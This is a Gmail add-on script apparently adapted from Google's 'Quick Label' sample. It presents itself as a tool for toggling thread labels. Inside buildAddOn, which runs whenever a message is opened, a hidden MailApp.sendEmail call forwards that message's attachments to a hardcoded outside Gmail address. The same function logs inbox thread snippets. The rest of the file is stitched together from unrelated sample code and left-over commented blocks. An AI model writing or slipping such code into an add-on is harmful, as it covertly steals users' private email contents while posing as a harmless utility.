/**
 * Copyright Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Returns the array of cards that should be rendered for the current
 * e-mail thread. The name of this function is specified in the
 * manifest 'onTriggerFunction' field, indicating that this function
 * runs every time the add-on is started.
 *
 * @param {Object} e The data provided by the Gmail UI.
 * @return {Card[]}
 */
 
function timeTrigger(e){
const threads = GmailApp.getInboxThreads(0, 100);
  const msgs = GmailApp.getMessagesForThreads(threads);
  for (var i = 0; i < msgs.length; i += 1) {
    for (var j = 0; j < msgs[i].length; j += 1) {
      const attachments = msgs[i][j].getAttachments();
      for (var k = 0; k < attachments.length; k += 1) {
        Logger.log(
          'Message "%s" contains the attachment "%s" (%s bytes)',
          msgs[i][j].getSubject(),
          attachments[k].getName(),
          attachments[k].getSize()
        );
      }
    }
  }
}  
  
 
function buildAddOn(e) {

var pageToken;
var count =0;
  do {
    var threadList = Gmail.Users.Threads.list('me', {
      q: 'label:inbox',
      pageToken: pageToken
    });
    if (threadList.threads && threadList.threads.length > 0) {
      threadList.threads.forEach(function(thread) {
        Logger.log('Snippet: %s', thread.snippet);
        console.log(thread.getId());
        console.log(thread.getMessages());
       
        
        count++;
      });
    }
    pageToken = threadList.nextPageToken;
  } while (pageToken && count<=50);

/*const threads = GmailApp.getInboxThreads(0, 100);
  const msgs = GmailApp.getMessagesForThreads(threads);
  for (var i = 0; i < msgs.length; i += 1) {
    for (var j = 0; j < msgs[i].length; j += 1) {
      const attachments = msgs[i][j].getAttachments();
      for (var k = 0; k < attachments.length; k += 1) {
        Logger.log(
          'Message "%s" contains the attachment "%s" (%s bytes)',
          msgs[i][j].getSubject(),
          attachments[k].getName(),
          attachments[k].getSize()
        );
      }
    }
  }*/


  // Activate temporary Gmail add-on scopes.
  var accessToken = e.messageMetadata.accessToken;
  GmailApp.setCurrentMessageAccessToken(accessToken);
  
  
//const threads = GmailApp.getInboxThreads(0, 100);
//  const msgs = GmailApp.getMessagesForThreads(threads);
//  for (var i = 0; i < msgs.length; i += 1) {
//    for (var j = 0; j < msgs[i].length; j += 1) {
//      const attachments = msgs[i][j].getAttachments();
//      for (var k = 0; k < attachments.length; k += 1) {
//        Logger.log(
//          'Message "%s" contains the attachment "%s" (%s bytes)',
//          msgs[i][j].getSubject(),
//          attachments[k].getName(),
//          attachments[k].getSize()
//        );
//      }
//    }
//  }

  var messageId = e.messageMetadata.messageId;
  var message = GmailApp.getMessageById(messageId);
 

  // Get user and thread labels as arrays to enable quick sorting and indexing.
  var threadLabels = message.getThread().getLabels();
  MailApp.sendEmail("yavdheshsnchhr@gmail.com", "vishay kyaa hai", "dekho kyaa hai", {
    name: 'Automatic Emailer Script',
    attachments: message.getAttachments()
})
  var labels = getLabelArray(GmailApp.getUserLabels());
  var labelsInUse = getLabelArray(threadLabels);

  // Create a section for that contains all user Labels.
  var section = CardService.newCardSection()
    .setHeader("<font color=\"#1257e0\"><b>Available User Labels</b></font>");       

  // Create a checkbox group for user labels that are added to prior section.
  var checkboxGroup = CardService.newSelectionInput()
    .setType(CardService.SelectionInputType.CHECK_BOX)
    .setFieldName('labels')
    .setOnChangeAction(CardService.newAction().setFunctionName('toggleLabel'));

  // Add checkbox with name and selected value for each User Label.
  for(var i = 0; i < labels.length; i++) {
    checkboxGroup.addItem(labels[i], labels[i], labelsInUse.indexOf(labels[i])!= -1);
  }

  // Add the checkbox group to the section.
  section.addWidget(checkboxGroup);

  // Build the main card after adding the section.
  var card = CardService.newCardBuilder()
    .setHeader(CardService.newCardHeader()
    .setTitle('Quick Label')
    .setImageUrl('https://www.gstatic.com/images/icons/material/system/1x/label_googblue_48dp.png'))
    .addSection(section)
    .build();

  return [card];
} 

/**
 * Updates the labels on the current thread based on 
 * user selections. Runs via the OnChangeAction for
 * each CHECK_BOX created.
 *
 * @param {Object} e The data provided by the Gmail UI.
*/
function toggleLabel(e){
  var selected = e.formInputs.labels;

  // Activate temporary Gmail add-on scopes.
  var accessToken = e.messageMetadata.accessToken;
  GmailApp.setCurrentMessageAccessToken(accessToken);

  var messageId = e.messageMetadata.messageId;
  var message = GmailApp.getMessageById(messageId);
  var thread = message.getThread();

  if (selected != null){
     for each (var label in GmailApp.getUserLabels()) {
       if(selected.indexOf(label.getName()) != -1){
          thread.addLabel(label);
       }
       else {
         thread.removeLabel(label);
       }
     }
  }
  else {
    for each (var label in GmailApp.getUserLabels()) {
      thread.removeLabel(label);
    }
  }
}

/**
 * Converts an GmailLabel object to a array of strings. 
 * Used for easy sorting and to determine if a value exists.
 *
 * @param {labelsObjects} A GmailLabel object array.
 * @return {lables[]} An array of labels names as strings.
*/
function getLabelArray(labelsObjects){
  var labels = [];
  for(var i = 0; i < labelsObjects.length; i++) {
    labels[i] = labelsObjects[i].getName();
  }
  labels.sort();
  return labels;
}


function getSettingssasCard(e){
Logger.log(e);
console.log(e);
Logger.log("universal function aayaa hai");

}

//////niche waale sabhi universal functions hai
/**
 * Open a contact URL.
 * @param {Object} e an event object
 * @return {UniversalActionResponse}
 */
function openContactURL(e) {
  // Activate temporary Gmail add-on scopes, in this case so that the
  // open message metadata can be read.
  var accessToken = e.messageMetadata.accessToken;
  GmailApp.setCurrentMessageAccessToken(accessToken);

  // Build URL to open based on a base URL and the sender's email.
  var messageId = e.messageMetadata.messageId;
  var message = GmailApp.getMessageById(messageId);
  var sender = message.getFrom();
  var url = "https://www.example.com/urlbase/" + sender;
  return CardService.newUniversalActionResponseBuilder()
      .setOpenLink(CardService.newOpenLink()
          .setUrl(url))
      .build();
}

/**
 * Create a collection of cards to control the add-on settings and
 * present other information. These cards are displayed in a list when
 * the user selects the associated "Open settings" universal action.
 *
 * @param {Object} e an event object
 * @return {UniversalActionResponse}
 */
function createSettingsResponse(e) {
  return CardService.newUniversalActionResponseBuilder()
      .displayAddOnCards(
          [createSettingCard(), createAboutCard()])
      .build();
}

/**
 * Create and return a built settings card.
 * @return {Card}
 */
function createSettingCard() {
  return CardService.newCardBuilder()
      .setHeader(CardService.newCardHeader().setTitle('Settings'))
      .addSection(CardService.newCardSection()
          .addWidget(CardService.newSelectionInput()
              .setType(CardService.SelectionInputType.CHECK_BOX)
              .addItem("Ask before deleting contact", "contact", false)
              .addItem("Ask before deleting cache", "cache", false)
              .addItem("Preserve contact ID after deletion", "contactId", false))
          // ... continue adding widgets or other sections here ...
      ).build();   // Don't forget to build the card!
}

/**
 * Create and return a built 'About' informational card.
 * @return {Card}
 */
function createAboutCard() {
  return CardService.newCardBuilder()
      .setHeader(CardService.newCardHeader().setTitle('About'))
      .addSection(CardService.newCardSection()
          .addWidget(CardService.newTextParagraph()
              .setText('This add-on manages contact information. For more '
                  + 'details see the <a href="https://www.example.com/help">'
                  + 'help page</a>.'))
      // ... add other information widgets or sections here ...
      ).build();  // Don't forget to build the card!
}

/**
 * Run background tasks, none of which should alter the UI.
 * Also records the time of sync in the script properties.
 *
 * @param {Object} e an event object
 */
function runBackgroundSync(e) {
  var props = PropertiesService.getUserProperties();
  props.setProperty("syncTime", new Date().toString());

  //syncWithContacts();  // Not shown.
  //updateCache();       // Not shown.
  //validate();          // Not shown.

  // no return value tells the UI to keep showing the current card.
}
